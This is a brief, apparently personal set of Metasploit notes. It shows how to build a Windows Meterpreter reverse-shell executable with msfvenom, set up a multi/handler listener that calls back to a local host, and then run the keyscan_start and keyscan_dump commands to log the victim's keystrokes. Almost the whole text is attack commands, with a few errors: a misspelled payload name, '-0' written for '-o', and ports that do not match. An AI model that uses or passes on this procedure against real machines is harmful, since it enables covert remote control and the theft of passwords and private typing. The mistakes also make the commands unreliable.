 msfvenom -p windows/x64/metepreter/reverse_tcp LHOST=192.168.1.7 LPORT=444 -f exe -0 shell.exe
 as the first command to create the meterpreter shell
 -p => payload
 LHOST is local IIP
 LPORT, is the port
 -f means output file is an .exe file
 -o is to name the output file

 setting up a listener using the msfconsole

 msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit (multi/handler) > set payload windows/x64/metepreter/reverse_tcp
payload => windows/x64/metepreter/reverse_tcp
msf6 exploit (multi/handler) > set LHOST 192.168.1.7
LHOST => 192.168.1.7
msf6 exploit (multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

then run the shell.exe command


    keyscan_start - this will start the keylogger on the Windows machine
    keyscan_dump - this will output everything to the Kali Linux terminal that was typed in the Windows keyboard since the keylogger was started
